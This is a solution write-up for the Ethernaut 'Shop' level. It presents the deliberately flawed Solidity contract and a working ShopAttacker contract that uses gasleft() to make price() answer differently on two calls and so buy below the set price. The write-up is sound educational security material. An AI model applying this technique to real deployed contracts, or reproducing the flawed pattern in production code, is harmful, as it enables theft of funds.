# Ethernaut - Shop - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

## Exploit

The goal is to get the `buy()` function to set the `price` to a value smaller than 100.

Note that this level is very similar to [Elevator](https://www.marcobesier.xyz/blog/ethernaut-solutions/elevator).

Here, however, we have the additional complication that our `price()` function must be a `view` function.
In other words, we are not allowed to implement any state-changing logic inside `price()` as we did in the Elevator solution.

Nonetheless, we can still craft a `price()` function that returns different values each time it is called by using `gasleft()`!

In a first attempt, we might try to have `price()` simply returning `gasleft()`, hoping that `gasleft()`'s value will be >= 100 when called the first time and < 100 when called the second time.
Going with this approach, we will observe that the attack will fail since the value of `gasleft()` after the second call to `price()` is still quite a bit higher than 100.
After some more experimentation, however, it's easy to subtract a suitable value from `gasleft()` such that `price()` has the desired behaviour.

For example, the following implementation will return a price > 100 when called the first time and a price of 42 when called the second time.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
}

contract ShopAttacker {
    IShop public immutable VICTIM;

    constructor(address victim) {
        VICTIM = IShop(victim);
    }

    function attack() external {
        VICTIM.buy();
    }

    function price() external view returns (uint256) {
        return gasleft() - 3714;
    }
}
```
